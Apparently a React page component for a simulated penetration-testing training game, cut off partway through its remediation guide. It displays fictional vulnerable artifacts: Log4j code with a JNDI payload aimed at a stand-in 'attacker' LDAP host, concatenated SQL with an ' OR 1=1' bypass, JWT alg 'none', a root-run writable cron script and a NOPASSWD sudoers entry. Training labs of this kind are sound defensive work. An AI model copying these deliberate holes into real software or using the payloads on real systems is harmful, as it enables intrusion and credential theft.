import React, { useState, useEffect } from 'react';
import { useParams, useNavigate, Link } from 'react-router-dom';
import {
  Server,
  ArrowLeft,
  Terminal,
  RotateCcw,
  Shield,
  Key,
  Skull,
  CheckCircle2,
  Lock,
  Code,
  FileText,
  AlertTriangle,
  Copy,
  Check,
  Cpu,
  Globe,
  Radio,
} from 'lucide-react';
import { useGameStore } from '../store/gameStore';
import { SimulationEngine } from '../simulation/simulationEngine';
import { soundManager } from '../audio/soundManager';
import { ChallengeObjective } from '../simulation/types';

export const MachineDetailPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const machineId = id || 'ecorp-hr';

  const { machines, setActiveMachine, resetMachine, submitFlag } = useGameStore();
  const machine = machines.find((m) => m.id === machineId) || machines[0];

  const engine = SimulationEngine.getInstance();
  const [objectives, setObjectives] = useState<ChallengeObjective[]>([]);
  const [discoveredPorts, setDiscoveredPorts] = useState<number[]>([]);
  const [activeTab, setActiveTab] = useState<'objectives' | 'services' | 'artifacts' | 'remediation' | 'flags'>('objectives');
  const [flagInput, setFlagInput] = useState('');
  const [flagFeedback, setFlagFeedback] = useState<{ message: string; success: boolean } | null>(null);
  const [copiedCode, setCopiedCode] = useState<string | null>(null);
  const [selectedArtifact, setSelectedArtifact] = useState<string>('logger');

  const refreshState = () => {
    setObjectives(engine.getObjectives(machine.id));
    setDiscoveredPorts(engine.getDiscoveredPorts(machine.id));
  };

  useEffect(() => {
    refreshState();
    const unsubscribe = engine.subscribe(() => {
      refreshState();
    });
    return () => unsubscribe();
  }, [machine.id]);

  const handleLaunchTerminal = () => {
    soundManager.playConnect();
    setActiveMachine(machine.id);
    navigate('/range');
  };

  const handleReset = () => {
    soundManager.playScanPing();
    resetMachine(machine.id);
    refreshState();
  };

  const handleFlagSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!flagInput.trim()) return;
    const res = submitFlag(flagInput.trim());
    if (res.success) {
      soundManager.playFlagSuccess();
      setFlagFeedback({ message: res.message, success: true });
    } else {
      soundManager.playKey();
      setFlagFeedback({ message: res.message, success: false });
    }
    setFlagInput('');
    refreshState();
  };

  const handleCopy = (key: string, text: string) => {
    soundManager.playKey();
    navigator.clipboard.writeText(text);
    setCopiedCode(key);
    setTimeout(() => setCopiedCode(null), 2000);
  };

  const completedCount = objectives.filter((o) => o.completed).length;
  const progressPercent = objectives.length > 0 ? Math.round((completedCount / objectives.length) * 100) : 0;

  const allArtifacts: Record<string, Record<string, { filename: string; language: string; content: string; desc: string }>> = {
    'ecorp-hr': {
      logger: {
        filename: '/opt/ecorp/Log4jAuditLogger.java',
        language: 'java',
        desc: 'Vulnerable Log4j 2.14.1 logging wrapper used in employee portal auditing.',
        content: `package com.ecorp.hr.audit;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jAuditLogger {
    private static final Logger logger = LogManager.getLogger(Log4jAuditLogger.class);

    public void processAuditPayload(String clientString) {
        // [VULNERABILITY CVE-2021-44228]
        // Untrusted user input logged directly into vulnerable Log4j engine with message lookups enabled.
        // Payload string \${jndi:ldap://attacker:1389/Exploit} triggers outbound JNDI lookup.
        logger.info("Audit entry received: " + clientString);
    }
}`,
      },
      pom: {
        filename: '/opt/ecorp/pom.xml',
        language: 'xml',
        desc: 'Maven build file declaring unpatched org.apache.logging.log4j dependency.',
        content: `<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.ecorp</groupId>
  <artifactId>hr-portal</artifactId>
  <version>2.4.1</version>
  <dependencies>
    <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-core</artifactId>
      <version>2.14.1</version> <!-- CRITICAL VULNERABILITY -->
    </dependency>
  </dependencies>
</project>`,
      },
      config: {
        filename: '/var/www/html/config.php',
        language: 'php',
        desc: 'Internal portal database credentials and LDAP endpoint configuration.',
        content: `<?php
// E-Corp Internal Database Connection
$db_host = "10.10.11.82";
$db_user = "ecorp_admin";
$db_pass = "S3cur3P@ssw0rd!2026";
$ldap_endpoint = "ldap://10.10.14.22:1389/Exploit";
?>`,
      },
      sudoers: {
        filename: '/etc/sudoers.d/alex',
        language: 'bash',
        desc: 'Insecure sudoers drop-in granting NOPASSWD access to /usr/bin/find.',
        content: `# Sysadmin note: developer needs find to clean temporary test logs
alex ALL=(ALL : ALL) NOPASSWD: /usr/bin/find
www-data ALL=(ALL : ALL) NOPASSWD: /usr/bin/find`,
      },
    },
    'iron-vault': {
      server: {
        filename: '/opt/ironbank/server.js',
        language: 'javascript',
        desc: 'Node.js Express API route containing raw string concatenation SQL injection in /api/login.',
        content: `const express = require('express');
const mysql = require('mysql2');
const jwt = require('jsonwebtoken');
require('dotenv').config();

const app = express();
app.use(express.json());

const db = mysql.createConnection({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME
});

// [VULNERABILITY CWE-89]: String concatenation SQL Injection
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
  db.query(sql, (err, results) => {
    if (results && results.length > 0) {
      // [VULNERABILITY CWE-347]: JWT Algorithm "none" accepted
      const token = jwt.sign({ user: results[0].username, role: results[0].role }, '', { algorithm: 'none' });
      return res.json({ success: true, token, role: results[0].role });
    }
    return res.status(401).json({ error: 'Invalid username or password' });
  });
});`,
      },
      env: {
        filename: '/opt/ironbank/.env',
        language: 'bash',
        desc: 'Application environment secrets file with database credentials and JWT signing secret.',
        content: `DB_HOST=127.0.0.1
DB_PORT=3306
DB_USER=ironbank_app
DB_PASS=VaultP@ss2026!
DB_NAME=ironbank_db
JWT_SECRET=super_secret_ironbank_key_do_not_share_2026
PORT=8080`,
      },
      backup: {
        filename: '/opt/ironbank/scripts/backup.sh',
        language: 'bash',
        desc: 'Automated database backup script with insecure write permissions for group finance_admin.',
        content: `#!/bin/bash
# IronBank Automated Ledger & DB Backup Routine (executed by root cron)
# Vulnerability: -rwxrwxr-x root:finance_admin allows group write hijacking
mysqldump -u ironbank_app -p'VaultP@ss2026!' ironbank_db > /tmp/ironbank_backup.sql
tar -czf /var/backups/ironbank_$(date +%Y%m%d).tar.gz /opt/ironbank`,
      },
      cron: {
        filename: '/etc/cron.d/vault-backup',
        language: 'bash',
        desc: 'Root-owned crontab file executing the writable backup script every minute.',
        content: `# /etc/cron.d/vault-backup
# Root cron scheduled task executing writable developer script
* * * * * root /opt/ironbank/scripts/backup.sh >/dev/null 2>&1`,
      },
    },
    'corp-dc01': {
      spn: {
        filename: '\\\\corp-dc01\\Shared\\ServiceAccounts.txt',
        language: 'text',
        desc: 'Active Directory service accounts documentation leaked via anonymous SMB share.',
        content: `OMNICORP IT SERVICE ACCOUNTS DIRECTORY
--------------------------------------
Account Name: svc_backup
Domain: OMNICORP.LOCAL
ServicePrincipalName: MSSQLSvc/corp-dc01.omnicorp.local:1433
Member Of: Backup Operators, Domain Users
Kerberos Pre-Auth: Disabled
Supported Encryption: RC4-HMAC (etype 23)
Notice: Service ticket requests do not require admin credentials.`,
      },
      groups: {
        filename: '\\\\corp-dc01\\SYSVOL\\Groups.xml',
        language: 'xml',
        desc: 'Active Directory Group Policy Preferences file containing legacy cpassword hash.',
        content: `<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{31B2F340-016D-11D2-945F-00C04FB984F9}">
  <User clsid="{DF5F1855-51E5-4d66-853C-484DA2923B7B}" name="svc_backup">
    <Properties action="U" newName="" userName="OMNICORP\\svc_backup"
      cpassword="j1Uyjxwkovpp3HH1JR6zBog/ACjyydHGKqA+TvYqiHG" />
  </User>
</Groups>`,
      },
      ms17010: {
        filename: 'MS17-010_Audit_Report.txt',
        language: 'text',
        desc: 'Vulnerability assessment notes covering EternalBlue SMBv1 flaw on port 445.',
        content: `VULNERABILITY ASSESSMENT REPORT: MS17-010 (CVE-2017-0143)
Target: Corp-DC01 (10.10.11.99:445)
Component: Microsoft SMBv1 srv.sys driver
Finding: SMBv1 protocol is enabled on the domain controller for legacy print services.
Risk: Remote Code Execution / Lateral Movement via buffer overflow in Transaction2 secondary requests.
Mitigation: Disable SMB1Protocol immediately across domain policy.`,
      },
      bloodhound: {
        filename: 'BloodHound_Edges.json',
        language: 'json',
        desc: 'Attack graph edge analysis showing privilege escalation path from svc_backup to Domain Admin.',
        content: `{
  "source": "SVC_BACKUP@OMNICORP.LOCAL",
  "target": "DOMAIN ADMINS@OMNICORP.LOCAL",
  "edge": "MemberOf",
  "properties": {
    "inherited": true,
    "via": "BACKUP OPERATORS@OMNICORP.LOCAL",
    "privilege": "SeBackupPrivilege",
    "escalation": "DCSync DRSUAPI domain hash dumping"
  }
}`,
      },
    },
  };

  const artifacts = allArtifacts[machine.id] || allArtifacts['ecorp-hr'];
  const currentArtifactKey = artifacts[selectedArtifact] ? selectedArtifact : Object.keys(artifacts)[0];

  return (
    <div className="h-full overflow-y-auto p-4 md:p-6 space-y-6 font-mono text-xs select-none bg-[#070a0f]">
      {/* Top Breadcrumb & Navigation */}
      <div className="flex flex-wrap items-center justify-between gap-4 border-b border-slate-800 pb-4">
        <div className="flex items-center space-x-3">
          <Link
            to="/machines"
            className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-slate-900 border border-slate-800 text-slate-300 hover:text-cyan-400 hover:border-cyan-500/50 transition-colors"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>CATALOG</span>
          </Link>

          <div>
            <div className="flex items-center gap-2">
              <Server className="w-5 h-5 text-emerald-400" />
              <h1 className="text-lg font-bold text-white tracking-wide">{machine.name}</h1>
              <span className="px-2 py-0.5 rounded text-[10px] bg-emerald-950 border border-emerald-800 text-emerald-400 font-bold">
                {machine.difficulty} // {machine.points.user + machine.points.root} PTS
              </span>
            </div>
            <div className="flex items-center gap-3 text-slate-400 text-xs mt-0.5">
              <span>HOST: <strong className="text-slate-200">{machine.id === 'iron-vault' ? 'iron-vault' : machine.id === 'corp-dc01' ? 'corp-dc01' : 'ecorp-hr'}</strong></span>
              <span>•</span>
              <span>IP: <strong className="text-emerald-400 font-bold">{machine.ip}</strong></span>
              <span>•</span>
              <span>OS: <strong className="text-slate-200">{machine.id === 'iron-vault' ? 'Linux (Debian 11 bullseye)' : machine.id === 'corp-dc01' ? 'Active Directory (Windows Server 2019)' : 'Linux (Ubuntu 22.04 LTS)'}</strong></span>
            </div>
          </div>
        </div>

        {/* Action Controls */}
        <div className="flex items-center space-x-2.5">
          <button
            onClick={handleReset}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 border border-slate-800 text-slate-300 hover:text-amber-400 hover:border-amber-500/50 transition-colors"
            title="Reset this machine to pristine state"
          >
            <RotateCcw className="w-4 h-4" />
            <span>RESET MACHINE</span>
          </button>

          <button
            onClick={handleLaunchTerminal}
            className="flex items-center gap-1.5 px-4 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-black font-bold shadow-[0_0_15px_rgba(16,185,129,0.3)] transition-all"
          >
            <Terminal className="w-4 h-4" />
            <span>LAUNCH PWNBOX</span>
          </button>
        </div>
      </div>

      {/* Progress & Compromise Status Bar */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <div className="p-4 rounded-xl bg-[#0c1017] border border-slate-800 flex flex-col justify-between">
          <span className="text-slate-400 text-[11px] font-bold">COMPROMISE LEVEL</span>
          <div className="flex items-center gap-2 mt-2">
            {machine.compromiseLevel === 'ROOT' ? (
              <span className="text-red-400 font-extrabold text-base flex items-center gap-1.5">
                <Skull className="w-5 h-5 text-red-500 animate-pulse" />
                SYSTEM ROOTED (UID 0)
              </span>
            ) : machine.compromiseLevel === 'USER' ? (
              <span className="text-emerald-400 font-extrabold text-base flex items-center gap-1.5">
                <Key className="w-5 h-5 text-emerald-400" />
                USER FOOTHOLD ({machine.id === 'corp-dc01' ? 'svc_backup' : machine.id === 'iron-vault' ? 'finance_admin' : 'alex'})
              </span>
            ) : machine.compromiseLevel === 'RECON' ? (
              <span className="text-cyan-400 font-extrabold text-base flex items-center gap-1.5">
                <Radio className="w-5 h-5 text-cyan-400" />
                RECON DISCOVERED
              </span>
            ) : (
              <span className="text-slate-500 font-extrabold text-base flex items-center gap-1.5">
                <Lock className="w-5 h-5" />
                UNCOMPROMISED
              </span>
            )}
          </div>
        </div>

        <div className="p-4 rounded-xl bg-[#0c1017] border border-slate-800 flex flex-col justify-between">
          <span className="text-slate-400 text-[11px] font-bold">USER FLAG ({machine.points.user} PTS)</span>
          <div className="flex items-center justify-between mt-2">
            <span className={machine.userClaimed ? 'text-emerald-400 font-bold' : 'text-slate-500'}>
              {machine.userClaimed ? 'CAPTURED & CLAIMED' : 'NOT CAPTURED'}
            </span>
            <Key className={`w-5 h-5 ${machine.userClaimed ? 'text-emerald-400' : 'text-slate-700'}`} />
          </div>
        </div>

        <div className="p-4 rounded-xl bg-[#0c1017] border border-slate-800 flex flex-col justify-between">
          <span className="text-slate-400 text-[11px] font-bold">ROOT FLAG ({machine.points.root} PTS)</span>
          <div className="flex items-center justify-between mt-2">
            <span className={machine.rootClaimed ? 'text-red-400 font-bold' : 'text-slate-500'}>
              {machine.rootClaimed ? 'ROOT PWNED' : 'NOT CAPTURED'}
            </span>
            <Skull className={`w-5 h-5 ${machine.rootClaimed ? 'text-red-400' : 'text-slate-700'}`} />
          </div>
        </div>

        <div className="p-4 rounded-xl bg-[#0c1017] border border-slate-800 flex flex-col justify-between">
          <div className="flex items-center justify-between text-slate-400 text-[11px] font-bold">
            <span>OBJECTIVES PROGRESS</span>
            <span className="text-white">{completedCount} / {objectives.length} ({progressPercent}%)</span>
          </div>
          <div className="w-full bg-slate-900 rounded-full h-2 mt-3 overflow-hidden border border-slate-800">
            <div
              className="bg-gradient-to-r from-emerald-500 to-cyan-400 h-full transition-all duration-500"
              style={{ width: `${progressPercent}%` }}
            />
          </div>
        </div>
      </div>

      {/* Main Tabs Navigation */}
      <div className="flex border-b border-slate-800 gap-2">
        <button
          onClick={() => setActiveTab('objectives')}
          className={`px-4 py-2 font-bold flex items-center gap-2 border-b-2 transition-all ${
            activeTab === 'objectives'
              ? 'border-emerald-400 text-white bg-slate-900/40'
              : 'border-transparent text-slate-400 hover:text-slate-200'
          }`}
        >
          <CheckCircle2 className="w-4 h-4 text-emerald-400" />
          <span>ATTACK JOURNEY ({completedCount}/{objectives.length})</span>
        </button>

        <button
          onClick={() => setActiveTab('services')}
          className={`px-4 py-2 font-bold flex items-center gap-2 border-b-2 transition-all ${
            activeTab === 'services'
              ? 'border-cyan-400 text-white bg-slate-900/40'
              : 'border-transparent text-slate-400 hover:text-slate-200'
          }`}
        >
          <Cpu className="w-4 h-4 text-cyan-400" />
          <span>SERVICE INVENTORY</span>
        </button>

        <button
          onClick={() => setActiveTab('artifacts')}
          className={`px-4 py-2 font-bold flex items-center gap-2 border-b-2 transition-all ${
            activeTab === 'artifacts'
              ? 'border-purple-400 text-white bg-slate-900/40'
              : 'border-transparent text-slate-400 hover:text-slate-200'
          }`}
        >
          <Code className="w-4 h-4 text-purple-400" />
          <span>APPLICATION CODE & FILES</span>
        </button>

        <button
          onClick={() => setActiveTab('remediation')}
          className={`px-4 py-2 font-bold flex items-center gap-2 border-b-2 transition-all ${
            activeTab === 'remediation'
              ? 'border-amber-400 text-white bg-slate-900/40'
              : 'border-transparent text-slate-400 hover:text-slate-200'
          }`}
        >
          <Shield className="w-4 h-4 text-amber-400" />
          <span>REMEDIATION GUIDE</span>
        </button>

        <button
          onClick={() => setActiveTab('flags')}
          className={`px-4 py-2 font-bold flex items-center gap-2 border-b-2 transition-all ${
            activeTab === 'flags'
              ? 'border-emerald-500 text-white bg-slate-900/40'
              : 'border-transparent text-slate-400 hover:text-slate-200'
          }`}
        >
          <Key className="w-4 h-4 text-emerald-400" />
          <span>SUBMIT FLAGS</span>
        </button>
      </div>

      {/* Tab 1: Attack Journey & Objective Timeline */}
      {activeTab === 'objectives' && (
        <div className="space-y-3">
          <div className="bg-[#0b1017] p-3 rounded-lg border border-slate-800 text-slate-400 text-xs">
            Follow the discoverable offensive penetration testing chain. Complete each milestone to unlock subsequent objectives.
          </div>

          <div className="space-y-2.5">
            {objectives.map((obj, idx) => {
              const isUnlocked = engine.isObjectiveUnlocked(obj.id);

              return (
                <div
                  key={obj.id}
                  className={`p-4 rounded-xl border transition-all flex items-start justify-between ${
                    obj.completed
                      ? 'bg-emerald-950/20 border-emerald-800/80 text-slate-200'
                      : isUnlocked
                      ? 'bg-[#0e1420] border-cyan-500/60 shadow-[0_0_15px_rgba(6,182,212,0.15)] text-slate-200'
                      : 'bg-black/30 border-slate-900 text-slate-600'
                  }`}
                >
                  <div className="flex items-start space-x-3.5">
                    <div className="mt-0.5">
                      {obj.completed ? (
                        <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                      ) : isUnlocked ? (
                        <div className="w-5 h-5 rounded-full border-2 border-cyan-400 flex items-center justify-center text-[10px] font-bold text-cyan-400 animate-pulse">
                          {idx + 1}
                        </div>
                      ) : (
                        <Lock className="w-4 h-4 text-slate-700 mt-0.5" />
                      )}
                    </div>

                    <div>
                      <div className="flex items-center gap-2">
                        <span className="font-bold text-sm text-white">
                          Step {idx + 1}: {obj.title}
                        </span>
                        <span className="text-[10px] px-2 py-0.5 rounded bg-slate-900 text-slate-400 border border-slate-800">
                          {obj.category}
                        </span>
                      </div>
                      <p className="text-slate-400 mt-1 leading-relaxed">{obj.description}</p>

                      {isUnlocked && !obj.completed && (
                        <div className="mt-2.5 inline-block text-[11px] text-cyan-300 font-bold bg-cyan-950/40 border border-cyan-800/60 px-2.5 py-1 rounded">
                          HINT: Open Pwnbox terminal and execute the relevant offensive action.
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="text-right whitespace-nowrap ml-4">
                    <span
                      className={`text-xs font-bold px-2.5 py-1 rounded ${
                        obj.completed
                          ? 'bg-emerald-950 text-emerald-400 border border-emerald-800'
                          : isUnlocked
                          ? 'bg-cyan-950 text-cyan-300 border border-cyan-800'
                          : 'bg-slate-900 text-slate-600 border border-slate-800'
                      }`}
                    >
                      +{obj.xp} XP
                    </span>
                    <span className="block text-[10px] text-slate-500 mt-1">
                      {obj.completed ? 'COMPLETED' : isUnlocked ? 'READY' : 'LOCKED'}
                    </span>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* Tab 2: Service Inventory & Web Registry */}
      {activeTab === 'services' && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="p-4 rounded-xl bg-[#0c1017] border border-slate-800 space-y-3">
            <h2 className="text-sm font-bold text-white flex items-center gap-2">
              <Cpu className="w-4 h-4 text-cyan-400" />
              <span>TCP SERVICE PORTS (10.10.11.45)</span>
            </h2>

            <div className="space-y-2">
              {machine.ports.map((p) => {
                const isDiscovered = discoveredPorts.includes(p.port);

                return (
                  <div
                    key={p.port}
                    className={`p-3 rounded-lg border flex items-center justify-between ${
                      isDiscovered
                        ? 'bg-cyan-950/20 border-cyan-800/60'
                        : 'bg-slate-900/20 border-slate-800/40 opacity-70'
                    }`}
                  >
                    <div>
                      <div className="flex items-center gap-2">
                        <span className="font-bold text-cyan-400 text-sm">{p.port}/TCP</span>
                        <span className="text-[10px] uppercase font-bold text-slate-400">({p.service})</span>
                        <span className="text-[10px] px-1.5 py-0.2 rounded bg-emerald-950 text-emerald-400 border border-emerald-800">
                          {p.state}
                        </span>
                      </div>
                      <div className="text-slate-300 text-xs mt-1">
                        {isDiscovered ? p.version : 'Hidden (Scan target with nmap)'}
                      </div>
                      {isDiscovered && p.banner && (
                        <div className="text-[11px] text-slate-500 mt-0.5 truncate max-w-sm">
                          Banner: {p.banner}
                        </div>
                      )}
                    </div>

                    <span
                      className={`text-[10px] px-2 py-0.5 rounded font-bold ${
                        isDiscovered ? 'text-cyan-400 bg-cyan-950/60' : 'text-slate-600 bg-slate-900'
                      }`}
                    >
                      {isDiscovered ? 'DISCOVERED' : 'UNMAPPED'}
                    </span>
                  </div>
                );
              })}
            </div>
          </div>

          <div className="p-4 rounded-xl bg-[#0c1017] border border-slate-800 space-y-3">
            <h2 className="text-sm font-bold text-white flex items-center gap-2">
              <Globe className="w-4 h-4 text-emerald-400" />
              <span>
                {machine.id === 'iron-vault'
                  ? 'FINANCIAL API & DATABASE ENDPOINTS'
                  : machine.id === 'corp-dc01'
                  ? 'ACTIVE DIRECTORY SMB SHARES & PROTOCOLS'
                  : 'WEB ROUTE DIRECTORY (PORT 80)'}
              </span>
            </h2>

            <div className="space-y-2">
              {(machine.id === 'iron-vault'
                ? [
                    { path: '/', code: 200, name: 'IronBank Financial Ledger API Overview' },
                    { path: '/api/login', code: 200, name: 'Authentication Endpoint (Vulnerable SQLi Concatenation)' },
                    { path: '/api/vault', code: 401, name: 'Protected Vault Ledger (Requires Bearer Token with Alg None)' },
                    { path: '/api/users', code: 401, name: 'Internal Treasury Directory & Accounts' },
                    { path: '/api/transfer', code: 401, name: 'Inter-Bank Wire Transfer Clearing Endpoint' },
                    { path: '/api/db-status', code: 200, name: 'MySQL Database Pool Connection Status' },
                  ]
                : machine.id === 'corp-dc01'
                ? [
                    { path: 'ADMIN$', code: 403, name: 'Administrative Remote Share (Access Denied)' },
                    { path: 'C$', code: 403, name: 'Default System Drive Share (Access Denied)' },
                    { path: 'IPC$', code: 200, name: 'Anonymous Remote IPC (Null Session Allowed)' },
                    { path: 'SYSVOL', code: 200, name: 'Logon Scripts & Group Policy Preferences (Groups.xml)' },
                    { path: 'Shared', code: 200, name: 'Corporate IT Documentation & ServiceAccounts.txt' },
                    { path: 'Port 88 (Kerberos)', code: 200, name: 'Kerberos KDC (TGS-REP SPN Ticket Requests)' },
                    { path: 'Port 389 (LDAP)', code: 200, name: 'Active Directory LDAP Domain Services' },
                  ]
                : [
                    { path: '/', code: 200, name: 'Employee Portal Root Page' },
                    { path: '/portal', code: 200, name: 'Staff Directory (alex@ecorp.htb)' },
                    { path: '/login', code: 200, name: 'Single Sign-On Authentication' },
                    { path: '/api/audit', code: 200, name: 'Log4j JNDI Exploit Trigger Endpoint' },
                    { path: '/admin', code: 403, name: 'Internal Restricted Subnet Gateway' },
                    { path: '/uploads', code: 301, name: 'Static File Upload Redirector' },
                  ]
              ).map((r) => (
                <div key={r.path} className="p-3 rounded-lg bg-slate-900/40 border border-slate-800 flex justify-between items-center">
                  <div>
                    <span className="font-bold text-white text-xs">{r.path}</span>
                    <span className="text-slate-400 block text-[11px]">{r.name}</span>
                  </div>
                  <span
                    className={`text-[10px] font-bold px-2 py-0.5 rounded ${
                      r.code === 200
                        ? 'text-emerald-400 bg-emerald-950 border border-emerald-800'
                        : r.code === 403
                        ? 'text-amber-400 bg-amber-950 border border-amber-800'
                        : 'text-slate-400 bg-slate-900 border border-slate-800'
                    }`}
                  >
                    STATUS {r.code}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Tab 3: Application Code & Files */}
      {activeTab === 'artifacts' && (
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
          <div className="space-y-2 md:col-span-1">
            {Object.entries(artifacts).map(([key, art]) => (
              <button
                key={key}
                onClick={() => setSelectedArtifact(key)}
                className={`w-full text-left p-3 rounded-lg border transition-all ${
                  currentArtifactKey === key
                    ? 'bg-purple-950/40 border-purple-500 text-white font-bold'
                    : 'bg-slate-900/40 border-slate-800 text-slate-400 hover:border-slate-700'
                }`}
              >
                <div className="flex items-center gap-1.5 text-xs">
                  <FileText className="w-3.5 h-3.5 text-purple-400" />
                  <span className="truncate">{art.filename.split('/').pop()}</span>
                </div>
                <span className="text-[10px] text-slate-500 block truncate mt-0.5">{art.desc}</span>
              </button>
            ))}
          </div>

          <div className="md:col-span-3 bg-black/60 border border-slate-800 rounded-xl overflow-hidden flex flex-col">
            <div className="flex items-center justify-between px-4 py-2 bg-slate-900 border-b border-slate-800 text-xs">
              <span className="text-slate-300 font-bold">{artifacts[currentArtifactKey]?.filename || ''}</span>
              <button
                onClick={() => handleCopy(currentArtifactKey, artifacts[currentArtifactKey]?.content || '')}
                className="flex items-center gap-1 text-slate-400 hover:text-white"
              >
                {copiedCode === currentArtifactKey ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copiedCode === currentArtifactKey ? 'COPIED' : 'COPY'}</span>
              </button>
            </div>
            <pre className="p-4 text-xs text-slate-200 overflow-x-auto font-mono leading-relaxed select-text">
              <code>{artifacts[currentArtifactKey]?.content || ''}</code>
            </pre>
          </div>
        </div>
      )}

      {/* Tab 4: Remediation Guide */}
      {activeTab === 'remediation' && (
        <div className="space-y-4">
          {machine.id === 'iron-vault' ? (
            <>
              <div className="p-5 rounded-xl bg-amber-950/20 border border-amber-800/80 space-y-3">
                <div className="flex items-center gap-2 text-amber-400 font-bold text-sm">
                  <AlertTriangle className="w-5 h-5" />
                  <span>VULNERABILITY REMEDIATION: SQL INJECTION (CWE-89)</span>
                </div>
                <p className="text-slate-300 text-xs leading-relaxed">
                  <strong>Root Cause:</strong> Direct concatenation of user input into SQL query strings on <code className="text-cyan-300">/api/login</code> allows attackers to inject arbitrary SQL statements (e.g. <code className="text-cyan-300">{"' OR 1=1 --"}</code>) and bypass authentication.
                </p>
                <div className="bg-black/40 border border-amber-900/60 p-3 rounded-lg space-y-2">
                  <span className="text-white font-bold block text-xs">Recommended Mitigation Steps:</span>
                  <ul className="list-disc list-inside text-slate-300 text-xs space-y-1">
                    <li><strong>Use Parameterized Queries:</strong> Replace string concatenation with prepared statements (<code className="text-emerald-400">db.execute('SELECT * FROM users WHERE username = ? AND password = ?', [user, pass])</code>).</li>
                    <li><strong>Adopt an ORM:</strong> Utilize Prisma, TypeORM, or Sequelize with built-in parameterization.</li>
                    <li><strong>Enforce Least Privilege:</strong> Grant the database user only required SELECT permissions on the authentication view.</li>
                  </ul>
                </div>
              </div>

              <div className="p-5 rounded-xl bg-purple-950/20 border border-purple-800/80 space-y-3">
                <div className="flex items-center gap-2 text-purple-400 font-bold text-sm">
                  <AlertTriangle className="w-5 h-5" />
                  <span>VULNERABILITY REMEDIATION: INSECURE JWT ALGORITHM HANDLING (CWE-347)</span>
                </div>
                <p className="text-slate-300 text-xs leading-relaxed">
                  <strong>Root Cause:</strong> Accepting tokens with <code className="text-cyan-300">{"alg: none"}</code> allows attackers to strip the signature entirely and forge arbitrary user and role claims.
                </p>
                <div className="bg-black/40 border border-purple-900/60 p-3 rounded-lg space-y-2">
                  <span className="text-white font-bold block text-xs">Recommended Mitigation Steps:</span>
                  <ul className="list-disc list-inside text-slate-300 text-xs space-y-1">
                    <li><strong>Explicitly Disallow None:</strong> Verify tokens with <code className="text-emerald-400">jwt.verify(token, secret, {"{ algorithms: ['HS256'] }"})</code>.</li>
                    <li><strong>Use Asymmetric Signatures:</strong> Migrate to RS256 or Ed25519 using private key signing and public key validation.</li>
                    <li><strong>Secure Secret Storage:</strong> Store signing secrets in a hardware security module (HSM) or cloud secrets manager.</li>
                  </ul>
                </div>
              </div>

              <div className="p-5 rounded-xl bg-red-950/20 border border-red-800/80 space-y-3">
                <div className="flex items-center gap-2 text-red-400 font-bold text-sm">
                  <AlertTriangle className="w-5 h-5" />
                  <span>PRIVILEGE ESCALATION REMEDIATION: WRITABLE CRON TASK SCRIPT</span>
                </div>
                <p className="text-slate-300 text-xs leading-relaxed">
                  <strong>Root Cause:</strong> Scheduled task script <code className="text-red-300">/opt/ironbank/scripts/backup.sh</code> executed by root crontab was writable by non-root group <code className="text-red-300">finance_admin</code>.
                </p>
                <div className="bg-black/40 border border-red-900/60 p-3 rounded-lg space-y-2">
                  <span className="text-white font-bold block text-xs">Recommended Mitigation Steps:</span>
                  <ul className="list-disc list-inside text-slate-300 text-xs space-y-1">
                    <li><strong>Fix Permissions:</strong> Run <code className="text-emerald-400">chown root:root /opt/ironbank/scripts/backup.sh && chmod 700 /opt/ironbank/scripts/backup.sh</code>.</li>
                    <li><strong>Audit Scheduled Jobs:</strong> Ensure all scripts in crontab directories are owned and writable only by root.</li>
                  </ul>
                </div>
              </div>
            </>
          ) : machine.id === 'corp-dc01' ? (
            <>
              <div className="p-5 rounded-xl bg-amber-950/20 border border-amber-800/80 space-y-3">
                <div className="flex items-center gap-2 text-amber-400 font-bold text-sm">
                  <AlertTriangle className="w-5 h-5" />
                  <span>VULNERABILITY REMEDIATION: ACTIVE DIRECTORY KERBEROASTING</span>
                </div>
                <p className="text-slate-300 text-xs leading-relaxed">
                  <strong>Root Cause:</strong> Service accounts with registered Service Principal Names (SPNs) using weak passwords and legacy RC4-HMAC encryption allow domain users to request TGS tickets and crack hashes offline.
                </p>
                <div className="bg-black/40 border border-amber-900/60 p-3 rounded-lg space-y-2">
                  <span className="text-white font-bold block text-xs">Recommended Mitigation Steps:</span>
                  <ul className="list-disc list-inside text-slate-300 text-xs space-y-1">
                    <li><strong>Group Managed Service Accounts (gMSA):</strong> Replace traditional service accounts with gMSAs featuring 128-character auto-rotated passwords.</li>
                    <li><strong>Enforce AES Encryption:</strong> Configure <code className="text-emerald-400">msDS-SupportedEncryptionTypes</code> to disable RC4-HMAC and mandate AES-128 and AES-256.</li>
                    <li><strong>Detection & Monitoring:</strong> Monitor Windows Security Event ID 4769 for abnormal TGS ticket requests with encryption type 0x17 (RC4).</li>
                  </ul>
                </div>
              </div>

              <div className="p-5 rounded-xl bg-cyan-950/20 border border-cyan-800/80 space-y-3">
                <div className="flex items-center gap-2 text-cyan-400 font-bold text-sm">
                  <AlertTriangle className="w-5 h-5" />
